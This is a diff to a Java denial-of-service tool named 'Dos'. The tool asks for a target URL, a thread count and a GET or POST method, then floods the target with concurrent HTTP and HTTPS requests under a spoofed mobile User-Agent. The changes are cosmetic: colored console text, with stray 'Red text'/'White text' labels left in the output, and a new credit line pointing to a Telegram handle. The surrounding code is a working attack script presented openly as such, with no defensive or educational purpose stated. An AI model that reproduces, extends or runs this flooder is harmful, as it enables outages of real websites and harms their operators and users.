@@ -10,7 +10,7 @@ public class Dos implements Runnable {
 
 
 
-    private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110615 Firefox/5.0 Fennec/142Mozilla/5.0 (Maemo; Linux armv7l; rv:89.0) Gecko/89.0 Firefox/89.0 Fennec/89.0Mozilla/5.0 (Android; Linux armv7l; rv:68.8.0) Gecko/20111216 Firefox/68.8.0 Fennec/68.8.0Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110615 Firefox/5.0 Fennec/E59";
+    private final String USER_AGENT =   "Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110615 Firefox/5.0 Fennec/142Mozilla/5.0 (Maemo; Linux armv7l; rv:89.0) Gecko/89.0 Firefox/89.0 Fennec/89.0Mozilla/5.0 (Android; Linux armv7l; rv:68.8.0) Gecko/20111216 Firefox/68.8.0 Fennec/68.8.0Mozilla/5.0 (Android; Linux armv7l; rv:5.0) Gecko/20110615 Firefox/5.0 Fennec/E59Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1";
 
     private static int amount = 0;
     private static String url = "";
@@ -52,23 +52,23 @@ public class Dos implements Runnable {
         int attakingAmoun = 0;
         Dos dos = new Dos(0, 0);
         Scanner in = new Scanner(System.in);
-        System.out.print("Enter Url: ");
+        System.out.print("\u001B[31mRed text Enter Url: ");
         url = in.nextLine();
         System.out.println("\n");
-        System.out.println("Starting Attack to url: " + url);
+        System.out.println("\u001B[31mRed text Starting Attack to url: " + url);
 
         String[] SUrl = url.split("://");
 
-        System.out.println("Checking connection to Site");
+        System.out.println("\u001B[31mRed text Checking connection to Site");
         if (SUrl[0] == "http" || SUrl[0].equals("http")) {
             dos.checkConnection(url);
         } else {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("Setting DDoS By: Shadow Tak");
+        System.out.println("Remake By : t.me/FendySEC");
 
-        System.out.print("Thread: ");
+        System.out.print("\u001B[31mRed text Thread: ");
         String amount = in.nextLine();
 
         if (amount == null || amount.equals(null) || amount.equals("")) {
@@ -77,7 +77,7 @@ public class Dos implements Runnable {
             Dos.amount = Integer.parseInt(amount);
         }
 
-        System.out.print("method: ");
+        System.out.print("\u001B[31mRed text Method: ");
         String option = in.nextLine();
         int ioption = 1;
         if (option == "get" || option == "GET") {
@@ -97,7 +97,7 @@ public class Dos implements Runnable {
         Thread.sleep(2000);
 
 
-        System.out.println("Starting Attack");
+        System.out.println("\u001B[31mRed text STARTING ATTACK");
         ArrayList<Thread> threads = new ArrayList<Thread>();
         for (int i = 0; i < Dos.amount; i++) {
             Thread t = new Thread(new Dos(i, ioption));
@@ -158,7 +158,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("POST attack done!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("POST attack done!: " + responseCode + "\u001B[37mWhite text Thread: " + this.seq);
     }
 
     private void getAttack(String url) throws Exception {
@@ -168,7 +168,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("GET attack done!: " + responseCode + "\u001B[37mWhite text Thread: " + this.seq);
     }
 
     private void sslPostAttack(String url) throws Exception {
@@ -185,7 +185,7 @@ public class Dos implements Runnable {
         wr.flush();
         wr.close();
         int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!:" + responseCode + "Thread: " + this.seq);
+        System.out.println("\u001B[31mRed text GET attack done!:" + responseCode + "\u001B[37mWhite text Thread: " + this.seq);
     }
 
     private void sslGetAttack(String url) throws Exception {
@@ -195,6 +195,6 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        System.out.println("GET attack done!: " + responseCode + "Thread: " + this.seq);
+        System.out.println("\u001B[31mRed text GET attack done!: " + responseCode + "\u001B[37mWhite text Thread: " + this.seq);
     }
-}
+            }
